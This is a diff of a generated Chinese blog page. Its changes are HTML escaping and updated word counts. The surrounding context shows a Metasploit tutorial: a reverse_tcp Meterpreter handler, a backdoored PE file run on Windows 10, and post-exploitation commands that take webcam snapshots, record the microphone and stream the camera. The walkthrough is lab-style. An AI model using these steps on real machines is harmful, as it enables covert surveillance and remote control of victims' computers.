@@ -425,14 +425,14 @@ root@kali:/ho">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        610
+                        624
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        3 分
                     </div>
                     
                 
@@ -480,21 +480,21 @@ root@kali:/ho">
 </ol>
 <pre class="line-numbers language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># msfconsole</span>
 
-msf5 <span class="token operator">></span> use multi/handler
+msf5 <span class="token operator">&gt;</span> use multi/handler
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
 
-payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
+payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LHOST 192.168.124.26
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LHOST 192.168.124.26
 
-LHOST <span class="token operator">=</span><span class="token operator">></span> 192.168.124.26
+LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.124.26
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 4444
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LPORT 4444
 
-LPORT <span class="token operator">=</span><span class="token operator">></span> 4444
+LPORT <span class="token operator">=</span><span class="token operator">&gt;</span> 4444
 
-msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ol start="8">
 <li><p>将添加好后门的 PE 软件，放到 windows 10 系统中并运行。 </p>
 </li>
@@ -505,32 +505,32 @@ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="to
 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.124.26:4444 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>179779 bytes<span class="token punctuation">)</span> to 192.168.124.25
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.168.124.26:4444 -<span class="token operator">></span> 192.168.124.25:1773<span class="token punctuation">)</span> at 2019-08-23 00:40:53 +0800
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.168.124.26:4444 -<span class="token operator">&gt;</span> 192.168.124.25:1773<span class="token punctuation">)</span> at 2019-08-23 00:40:53 +0800
 
 // ** 查看摄像头 ** //
 
-meterpreter <span class="token operator">></span> webcam_list
+meterpreter <span class="token operator">&gt;</span> webcam_list
 1: Chicony USB2.0 Camera
 
 // ** 用摄像头进行拍照 ** //
 
-meterpreter <span class="token operator">></span> webcam_snap -i 1
+meterpreter <span class="token operator">&gt;</span> webcam_snap -i 1
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got frame
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped
 Webcam shot saved to: /root/sUqFcfWF.jpeg
-meterpreter <span class="token operator">></span> gimp_device_info_set_device: trying to <span class="token keyword">set</span> GdkDevice <span class="token string">'VirtualPS/2 VMware VMMouse'</span> on GimpDeviceInfo <span class="token function">which</span> already has a device
+meterpreter <span class="token operator">&gt;</span> gimp_device_info_set_device: trying to <span class="token keyword">set</span> GdkDevice <span class="token string">'VirtualPS/2 VMware VMMouse'</span> on GimpDeviceInfo <span class="token function">which</span> already has a device
 
 // ** 录制声音 ** //
 
-meterpreter <span class="token operator">></span>  record_mic
+meterpreter <span class="token operator">&gt;</span>  record_mic
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped
 Audio saved to: /root/fSAEXVSs.wav
 
 // ** 开启摄像头（在 /var/www//webcam.htm 中可以看到截取的图片） ** //
 
-meterpreter <span class="token operator">></span> run webcam -p /var/www/
+meterpreter <span class="token operator">&gt;</span> run webcam -p /var/www/
 
 <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/webcam.
 <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/windows/manage/webcam OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
@@ -624,8 +624,8 @@ run webcam -s<span aria-hidden="true" class="line-numbers-rows"><span></span><sp
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">/
-├── bin -> usr/bin                  //存放系统管理员及普通用户使用的命令和可执行的二进制文件
-├── boot                            //存放启动 linux 时使用</div>
+├── bin -&gt; usr/bin                  //存放系统管理员及普通用户使用的命令和可执行的二进制文件
+├── boot                            //存放启动 linux </div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-24
@@ -819,7 +819,7 @@ scheme: Pisces
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">45.8k</span>&nbsp;字
+                class="white-color">46.5k</span>&nbsp;字
                
             
 			
